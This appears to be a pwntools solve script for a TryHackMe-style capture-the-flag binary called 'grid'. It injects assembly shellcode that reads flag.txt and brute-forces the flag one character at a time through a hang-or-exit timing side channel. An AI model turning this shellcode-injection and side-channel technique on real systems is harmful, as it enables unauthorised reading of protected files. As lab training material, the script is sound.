#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('grid')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x015A7
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def main():
    charset = string.printable
    flag = "THM{nice_sid3_channel_look"

    while len(flag) != 50:
        for char in charset:
            print(flag + char)

            init()
            sc = asm(
                f""" 
                open:
                    mov rax, 0x2
                    lea rdi, [rip+filename]
                    xor rsi, rsi
                    syscall
                
                read:
                    mov rdi, rax
                    lea rsi, [rsp+0x100]
                    mov rdx, 0x50
                    xor rax, rax
                    syscall

                add rsi, {len(flag)}

                side_channel:
                    cmp BYTE PTR [rsi], {ord(char)}
                    je hang

                exit:
                    mov rdi, 0x1337
                    mov rax, 0x3c
                    syscall
                
                hang:
                    jmp hang
                    
                filename:
                    .ascii "flag.txt"
                    .byte 0x0
                """
            )

            io.sendlineafter(b":", b"4")
            io.sendafter(b":", sc)

            good = True

            try:
                io.recvuntil(b"Processing\n")
                a = io.recv(1024, timeout=5)
            except EOFError:
                good = False

            io.close()

            if good:
                flag += char
                print(f"Flag: {flag}")
                break


if __name__ == '__main__':
    main()
